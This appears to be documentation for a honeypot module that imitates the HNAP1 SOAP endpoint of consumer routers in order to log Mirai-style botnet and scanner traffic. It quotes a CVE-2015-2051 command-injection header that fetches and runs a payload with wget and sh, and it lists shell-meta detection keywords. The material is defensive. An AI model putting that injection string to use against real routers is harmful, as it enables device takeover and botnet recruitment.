# Fake HNAP1 router trap

Flux ships a deception surface for the SOAP-over-HTTP HNAP1 control
endpoint that lives on a long tail of consumer routers (D-Link
DIR-series, Linksys WRT, Zyxel home gateways). The trap aims at two
classes of scanner traffic:

1. **Mirai-style botnet workers** shipping CVE-2015-2051 / CVE-2019-6977
   command injection — the SOAPAction request header value is
   concatenated into a shell command on vulnerable firmware, e.g.
   `SOAPAction: "http://purenetworks.com/HNAP1/`wget http://x;sh`"`.
2. **Multi-target enterprise scanners** that use `/HNAP1` as a router
   fingerprint before deciding which CVE to ship next.

## Routed paths

| Path | Methods | Response |
| --- | --- | --- |
| `/HNAP1`, `/HNAP1/` | `GET`, `HEAD` | SOAP envelope with a `<DeviceSettings>` body advertising vendor / model / firmware |
| `/HNAP1`, `/HNAP1/` | `POST` | Generic SOAP `OK` envelope; the response element name tracks the SOAPAction header so chained scanners parsing the response don't bail |

Path matching is case-insensitive. The `Server` response header is
pinned to `Mathopd/1.5p6` — the embedded HTTP server most D-Link
DIR firmware advertises — so scanners gating exploit delivery on the
banner stay on the chain.

## Logged fields

Standard request metadata is logged for every event plus:

- `result` — `hnap1-discovery` (GET / HEAD) or `hnap1-soap-action`
  (POST)
- `hnap1Path`
- `hnap1Method`
- `hnap1SoapAction` — first 512 bytes of the `SOAPAction` request
  header; this is where CVE-2015-2051 ships its command payload, so
  it's preserved for analysis
- `hnap1HasCmdInjection` — `true` when the SOAPAction value, query
  string, or body contains shell-meta indicators (`$(`, backtick,
  `&&`, `||`, `;`, `|`, `wget`, `curl`, `/bin/sh`, `tftp`,
  `busybox`)
- `bodyPreview` for requests with payload bodies

## Tuning

- `HONEYPOT_HNAP1_ENABLED` (default: enabled)
- `HONEYPOT_HNAP1_PATHS_CSV` to override matched path set
- `HONEYPOT_HNAP1_VENDOR` (default: `D-Link`) — vendor name in the
  discovery envelope
- `HONEYPOT_HNAP1_MODEL` (default: `DIR-825`) — model name in the
  discovery envelope
- `HONEYPOT_HNAP1_FIRMWARE_VERSION` (default: `2.10NA`) — pinned to a
  release in the public-disclosure window for CVE-2015-2051 so
  scanners gating exploit delivery on a vulnerable banner don't bail

## Why this trap exists

`/HNAP1` is one of the highest-volume Mirai-family probe paths on the
public internet — Linux IoT botnets enumerate it daily looking for
unpatched D-Link / Linksys consumer routers. A bare 404 leaks "this
isn't a router" and the worker walks away after the banner-grab; with
a plausible HNAP1 SOAP envelope and the `Mathopd/` server header it
stays long enough to ship the follow-on payload, where the actual
intel lives — the SOAPAction header value carries the dropper command
on CVE-2015-2051.

The same surface also catches enterprise multi-target scanners that
add `/HNAP1` to their fingerprint dictionary as a leading indicator
of router-targeted tooling — a useful early signal that a dedicated
router-CVE fleet is about to appear.
